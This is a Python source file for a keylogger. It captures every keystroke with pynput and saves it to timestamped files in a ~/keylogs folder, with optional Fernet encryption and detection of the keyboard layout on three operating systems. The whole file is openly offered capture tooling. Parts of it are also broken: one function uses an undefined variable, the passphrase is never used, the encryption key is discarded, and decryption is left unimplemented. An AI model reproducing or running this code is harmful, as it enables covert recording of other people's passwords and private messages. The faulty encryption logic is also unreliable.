import os
import time
import argparse
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
import platform
import subprocess
import getpass

def get_keyboard_layout_name():
    system = platform.system()
    print("Operating system: " + system)
    if system == "Windows":
        import ctypes
        buffer_size = 9  # Max size for keyboard layout names
        buffer = ctypes.create_unicode_buffer(buffer_size)
        ctypes.windll.user32.GetKeyboardLayoutNameW(buffer_size)
        return buffer.value
    elif system == "Darwin":
        try:
            output = subprocess.check_output(["osascript", "-e", 'do shell script "ioreg -n IOHIDKeyboard -r | awk \'/KeyboardLanguage/ { print $4 }\'"'])
            layout_name = output.decode("utf-8").strip()
            return layout_name
        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
            return "Unknown"
    elif system == "Linux":
        try:
            output = subprocess.check_output(["setxkbmap", "-query"]).decode("utf-8")
            layout_line = [line for line in output.splitlines() if line.startswith("layout:")][0]
            layout_name = layout_line.split(":")[1].strip()
            return layout_name
        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
            return "Unknown"
    else:
        return "Unknown"

# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Keylogger with log file encryption.")
    parser.add_argument("--encrypt", action="store_true", help="Enable log file encryption.")
    parser.add_argument("--decrypt", action="store_true", help="Enable log file decryption.")
    parser.add_argument("--passphrase", type=str, help="Specify the encryption passphrase.")
    return parser.parse_args()

# Generate a timestamp for the log file
def get_timestamp():
    return time.strftime("%Y-%m-%d_%H-%M-%S")

# Define a function to create a new log_file
def create_new_log_file(log_folder):
    timestamp = get_timestamp()
    log_filename = os.path.join(log_folder, f"keylog_{timestamp}.txt")
    return log_filename

# Define a function to write the key presses to a log file.
def write_to_log(log_file, key, cipher_suite):
    if hasattr(key, "name"):
        key_str = f"[{key.name}]"
    else:
        key_str = str(key)

    # Encrypt the key_str if encryption is enabled
    if cipher_suite:
        encrypted_data = cipher_suite.encrypt(key_str.encode())
        log_file.write(encrypted_data.decode() + "\n")
    else:
        log_file.write(key_str + "\n")

    log_file.flush()

# Create a function to encrypt and write data to the log file
def encrypt_and_write(log_file, data):
    if cipher_suite:
        encrypted_data = cipher_suite.encrypt(data.encode())
        log_file.write(encrypted_data.decode())
    else:
        write_to_log(log_file, data)
    log_file.flush()

# Function to decrypt encrypted log files
def decrypt_log_files(passphrase):
    # TODO: Implement this function
    pass

# Function to securely obtain a passphrase from the user
def get_passphrase():
    passphrase = getpass.getpass("Enter an encryption passphrase: ")
    return passphrase

# Define a function that listens for key presses and writes them to the log file.
def on_key_press(key, log_file, args, cipher_suite):
    if key == Key.esc:
        log_file.close()
        return False
    if args.encrypt:
        write_to_log(log_file, key, cipher_suite)
    else:
        write_to_log(log_file, key, None)

def main():
    # Parse command-line arguments
    args = parse_arguments()

    # Define the folder name and create it in the user's home directory
    log_folder = os.path.join(os.path.expanduser("~"), "keylogs")
    os.makedirs(log_folder, exist_ok=True)

    keyboard_layout = get_keyboard_layout_name()
    print(f"Keyboard Layout: {keyboard_layout}")

    current_log_file = open(create_new_log_file(log_folder), "a")

    # Generate an encryption key and initialize the Fernet cipher
    encryption_key = None
    cipher_suite = None

    if args.encrypt:
        encryption_key = Fernet.generate_key()
        cipher_suite = Fernet(encryption_key)

        if args.passphrase:
            passphrase = args.passphrase
        else:
            passphrase = get_passphrase()

    if args.decrypt:
        if not args.passphrase:
            print("Error: Decryption requires a passphrase. Use the --passphrase flag to specify the passphrase.")
            return
        decrypt_log_files(args.passphrase)
        return

    # Set up the keylogger
    with Listener(on_press=lambda key: on_key_press(key, current_log_file, args, cipher_suite)) as listener:
        listener.join()

if __name__ == "__main__":
    main()
